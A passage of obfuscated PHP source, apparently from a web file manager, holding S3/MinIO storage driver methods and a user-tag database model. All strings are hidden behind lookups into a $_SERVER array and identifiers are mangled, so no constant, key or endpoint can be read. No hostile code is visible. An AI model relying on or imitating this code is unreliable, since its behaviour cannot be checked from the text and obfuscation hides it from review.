implode($©¥ıó“ë[262], $öÑ³à‡©); $³ûüÃŞà = base64_encode(hash_hmac($©¥ıó“ë[263], $›ïâõ—Ç, $this->secret, !0)); $·–ñØ‰Û = $©¥ıó“ë[264] . $this->accessKey . $©¥ıó“ë[4] . $³ûüÃŞà; if (strpos($¡úŸ‡£Œ, $©¥ıó“ë[258]) === 0) { return array($©¥ıó“ë[265] => $·–ñØ‰Û, $©¥ıó“ë[255] => $ƒÛ¬ü¬Æ); } return $·–ñØ‰Û; } public function listUploadParts($—ÛŸóŠ”, $ÏÌºÁÅ× = array()) { $ÈÊÜ§ö¬ =& $_SERVER[¿ğÚ‰±–]; $ô ­ùˆ» = str_replace($ÈÊÜ§ö¬[266], $ÈÊÜ§ö¬[12], $ÏÌºÁÅ×[$ÈÊÜ§ö¬[169]]); $ò‘ì‰ÑÎ = $this->client->listParts($this->bucket, $—ÛŸóŠ”, $ô ­ùˆ»); if (!$ò‘ì‰ÑÎ) { return !1; } unset($ÏÌºÁÅ×[$ÈÊÜ§ö¬[256]], $ÏÌºÁÅ×[$ÈÊÜ§ö¬[260]]); $ÏÌºÁÅ×[$ÈÊÜ§ö¬[97]] = $—ÛŸóŠ”; $ ˜ğÚ = $this->multiUploadAuthData($—ÛŸóŠ”, $ÏÌºÁÅ×); if (empty($ ˜ğÚ)) { return !1; } return array($ÈÊÜ§ö¬[265] => $ ˜ğÚ, $ÈÊÜ§ö¬[255] => $ÏÌºÁÅ×[$ÈÊÜ§ö¬[255]], $ÈÊÜ§ö¬[267] => $ò‘ì‰ÑÎ); } public function getHost() { $³É¾™À³ =& $_SERVER[¿ğÚ‰±–]; $¢Ò‘¢¹² = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($³É¾™À³[70], $³É¾™À³[64], $³É¾™À³[69], $³É¾™À³[62]))) { return $¢Ò‘¢¹² . $³É¾™À³[8] . $this->bucket; } $¢Ò‘¢¹² = explode($³É¾™À³[210], $¢Ò‘¢¹²); return $¢Ò‘¢¹²[0] . $³É¾™À³[210] . $this->bucket . $³É¾™À³[10] . $¢Ò‘¢¹²[1]; } public function size($åÅ¶”Š¸) { $Ì‘À…ã¦ = $this->objectMeta($åÅ¶”Š¸); return $Ì‘À…ã¦ ? $Ì‘À…ã¦[$_SERVER[¿ğÚ‰±–][79]] : 0; } public function info($â‹ö¢¢Ó) { if ($this->isFolder($â‹ö¢¢Ó)) { return $this->folderInfo($â‹ö¢¢Ó); } else { if ($this->isFile($â‹ö¢¢Ó)) { return $this->fileInfo($â‹ö¢¢Ó); } } return !1; } public function exist($¸‹æÆ) { return $this->isFile($¸‹æÆ) || $this->isFolder($¸‹æÆ); } public function isFile($·¬êª·) { return !$this->isFolder($·¬êª·) && $this->objectMeta($·¬êª·); } public function isFolder($Î¼ñóÁº) { return $this->cacheMethod($_SERVER[¿ğÚ‰±–][179], $Î¼ñóÁº); } protected function objectMeta($Ğ°œÅÇÊ) { return $this->cacheMethod($_SERVER[¿ğÚ‰±–][181], $Ğ°œÅÇÊ); } protected function _objectMeta($¸€éÒíê) { $¨ô÷‹Ê =& $_SERVER[¿ğÚ‰±–]; $¸€éÒíê = rtrim($¸€éÒíê, $¨ô÷‹Ê[8]); try { $ƒšú¹ù = $this->client->getObjectInfo($this->bucket, $¸€éÒíê); if (!isset($ƒšú¹ù[$¨ô÷‹Ê[252]]) && isset($ƒšú¹ù[$¨ô÷‹Ê[268]])) { $ƒšú¹ù[$¨ô÷‹Ê[252]] = $ƒšú¹ù[$¨ô÷‹Ê[268]]; } } catch (Exception $ğãùªœë) { $ƒšú¹ù = !1; } if (!$ƒšú¹ù) { } return $ƒšú¹ù; } protected function _isFolder($…Ëñêúê) { $ÍéøŒ­ì =& $_SERVER[¿ğÚ‰±–]; $…Ëñêúê = rtrim($…Ëñêúê, $ÍéøŒ­ì[8]); if ($…Ëñêúê == $ÍéøŒ­ì[12] || $…Ëñêúê == $ÍéøŒ­ì[8]) { return !0; } $ˆ‹ËòÏÇ = $this->client->getBucket($this->bucket, $…Ëñêúê, null, 1); if (empty($ˆ‹ËòÏÇ[$ÍéøŒ­ì[236]])) { return !1; } $áßË¡ƒ = $ˆ‹ËòÏÇ[$ÍéøŒ­ì[236]][0][$ÍéøŒ­ì[32]]; return stripos($áßË¡ƒ, $…Ëñêúê . $ÍéøŒ­ì[8]) === 0 ? !0 : !1; if (substr($áßË¡ƒ, -1) == $ÍéøŒ­ì[8]) { return !0; } if (get_path_this($áßË¡ƒ) == get_path_this($…Ëñêúê)) { return !1; } return !0; } public function listObject($ÓÀ…»½Â) { return $this->fileList($ÓÀ…»½Â, $_SERVER[¿ğÚ‰±–][12], !0); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($‚¢˜Ş†) { $æÑ“‚š =& $_SERVER[¿ğÚ‰±–]; parent::__construct($‚¢˜Ş†); $this->setSignVersion($æÑ“‚š[247]); if (!$this->region) { $this->region = $æÑ“‚š[269]; $this->client->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function checkRegion() { $ˆñ©˜Èá = $this->getBucketRgn(); return $this->region == $ˆñ©˜Èá ? !0 : !1; } public function uploadFormData($ˆ·‘ëÕÏ, $–Â¡¦ = 3600) { $òƒñóø¤ =& $_SERVER[¿ğÚ‰±–]; $Âè˜³’… = $òƒñóø¤[229]; $±ıÈôÂ = $òƒñóø¤[270]; $º³Ş—” = $òƒñóø¤[62]; $«ä†ëåµ = gmdate($òƒñóø¤[271]); $âöÒøş¡ = gmdate($òƒñóø¤[272]); $Ùö¥ıûÛ = $òƒñóø¤[273]; $ìĞ™ÊÊ = $–Â¡¦ . $òƒñóø¤[12]; $›ä…á³õ = $òƒñóø¤[274]; $ã›µÆÅÉ = array($this->accessKey, $âöÒøş¡, $this->region, $º³Ş—”, $Ùö¥ıûÛ); $¹á£ß¯ˆ = implode($òƒñóø¤[8], $ã›µÆÅÉ); $Ü¹¹ »— = array($òƒñóø¤[275] => gmdate($òƒñóø¤[276], strtotime($òƒñóø¤[277])), $òƒñóø¤[278] => array(array($òƒñóø¤[279] => $this->bucket), array($òƒñóø¤[280] => $Âè˜³’…), array($òƒñóø¤[281], $òƒñóø¤[282], $òƒñóø¤[12]), array($òƒñóø¤[281], $òƒñóø¤[283], $òƒñóø¤[12]), array($òƒñóø¤[281], $òƒñóø¤[284], $òƒñóø¤[12]), array($òƒñóø¤[285] => $›ä…á³õ), array($òƒñóø¤[286] => $¹á£ß¯ˆ), array($òƒñóø¤[287] => $±ıÈôÂ), array($òƒñóø¤[288] => $«ä†ëåµ), array($òƒñóø¤[289] => $ìĞ™ÊÊ))); $›ù¢—Õ‹ = base64_encode(json_encode($Ü¹¹ »—)); $ÁÁœ“¶€ = hash_hmac($òƒñóø¤[290], $âöÒøş¡, $òƒñóø¤[291] . $this->secret, !0); $”·ı©¾• = hash_hmac($òƒñóø¤[290], $this->region, $ÁÁœ“¶€, !0); $Ñäîş¥Ó = hash_hmac($òƒñóø¤[290], $º³Ş—”, $”·ı©¾•, !0); $¤°Å³è = hash_hmac($òƒñóø¤[290], $Ùö¥ıûÛ, $Ñäîş¥Ó, !0); $¡ª­ Šä = hash_hmac($òƒñóø¤[290], $›ù¢—Õ‹, $¤°Å³è); $õé™Ö¦ê = array($òƒñóø¤[246] => $òƒñóø¤[12], $òƒñóø¤[292] => $òƒñóø¤[12], $òƒñóø¤[280] => $Âè˜³’…, $òƒñóø¤[285] => $›ä…á³õ, $òƒñóø¤[293] => $›ù¢—Õ‹, $òƒñóø¤[294] => $¹á£ß¯ˆ, $òƒñóø¤[295] => $±ıÈôÂ, $òƒñóø¤[296] => $«ä†ëåµ, $òƒñóø¤[297] => $ìĞ™ÊÊ, $òƒñóø¤[298] => $¡ª­ Šä, $òƒñóø¤[208] => $this->getHost()); return $õé™Ö¦ê; } } goto d©©ï™¼ó•; d¨êÌõ„ßÁ: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\x65\162\137\146\x61\x76"; protected function cacheFunctionAlias($ñ±Æõœ¬) { $ï›¹Ê =& $_SERVER[¿ğÚ‰±–]; return array($ï›¹Ê[2091] => array($ï›¹Ê[2505] . USER_ID, $ï›¹Ê[2092])); } protected function listData() { $ª¼ÆÊœ =& $_SERVER[¿ğÚ‰±–]; $»´ñÚ‘ = array($ª¼ÆÊœ[1768] => USER_ID, $ª¼ÆÊœ[557] => array($ª¼ÆÊœ[2095], 0)); $´ƒ×ëÀ = $ª¼ÆÊœ[2506]; $Á–ÙÃ¢÷ = $this->field($´ƒ×ëÀ)->where($»´ñÚ‘)->order($ª¼ÆÊœ[2098])->select(); return $Á–ÙÃ¢÷ ? $Á–ÙÃ¢÷ : array(); } protected function addToTag($Òˆºû×Á, $³ôÚ•˜ú) { $İ¸£»Ø® =& $_SERVER[¿ğÚ‰±–]; if (!Model($İ¸£»Ø®[2242])->listData($³ôÚ•˜ú)) { return !1; } if (is_numeric($Òˆºû×Á)) { $Ä™Ÿ­‰õ = Model($İ¸£»Ø®[902])->pathInfo($Òˆºû×Á); if (!$Ä™Ÿ­‰õ) { return !1; } } else { $Ä™Ÿ­‰õ = IO::infoSimple($Òˆºû×Á); if (!$Ä™Ÿ­‰õ) { return !1; } $àÓêûù® = $Ä™Ÿ­‰õ[$İ¸£»Ø®[32]]; $€Äö¸ì˜ = $Ä™Ÿ­‰õ[$İ¸£»Ø®[33]]; if (isset($Ä™Ÿ­‰õ[$İ¸£»Ø®[485]])) { $€Äö¸ì˜ = $Ä™Ÿ­‰õ[$İ¸£»Ø®[485]] == $İ¸£»Ø®[91] ? $İ¸£»Ø®[78] : $İ¸£»Ø®[230]; } } $•¾…²Å = array($İ¸£»Ø®[1768] => USER_ID, $İ¸£»Ø®[557] => $³ôÚ•˜ú, $İ¸£»Ø®[495] => $Òˆºû×Á, $İ¸£»Ø®[496] => $€Äö¸ì˜ ? $€Äö¸ì˜ : $İ¸£»Ø®[490], $İ¸£»Ø®[494] => $àÓêûù® ? $àÓêûù® : $İ¸£»Ø®[12], $İ¸£»Ø®[1980] => 0); if ($this->where($•¾…²Å)->find()) { return !1; } return $this->add($•¾…²Å); } protected function removeFromTag($ŠÍ÷öúÍ, $†³€ñˆğ) { $òÎŸÄ =& $_SERVER[¿ğÚ‰±–]; if (!Model($òÎŸÄ[2242])->listData($†³€ñˆğ)) { return !1; } if (is_array($ŠÍ÷öúÍ)) { $ŠÍ÷öúÍ = array($òÎŸÄ[7], $ŠÍ÷öúÍ); } $÷É—µÚ½ = array($òÎŸÄ[1768] => USER_ID, $òÎŸÄ[557] => $†³€ñˆğ, $òÎŸÄ[495] => $ŠÍ÷öúÍ); return $this->where($÷É—µÚ½)->delete(); } protected function removeByTag($¸„ÎËï±) { $ÈıöªÏ´ =& $_SERVER[¿ğÚ‰±–]; if (!$¸„ÎËï±) { return !1; } $Ä¡ùé­È = array($ÈıöªÏ´[1768] => USER_ID, $ÈıöªÏ´[557] => $¸„ÎËï±); return $this->where($Ä¡ùé­È)->delete(); } protected function removeBySource($¤½¡ª¬) { $ĞØš½Šì =& $_SERVER[¿ğÚ‰±–]; if (is_array($¤½¡ª¬)) { $¤½¡ª¬ = array($ĞØš½Šì[7], $¤½¡ª¬); } $Ÿ¿ˆñø = array($ĞØš½Šì[1768] => USER_ID, $ĞØš½Šì[557] => array($ĞØš½Šì[1099], 0), $ĞØš½Šì[495] => $¤½¡ª¬); return $this->where($Ÿ¿ˆñø)->delete(); } }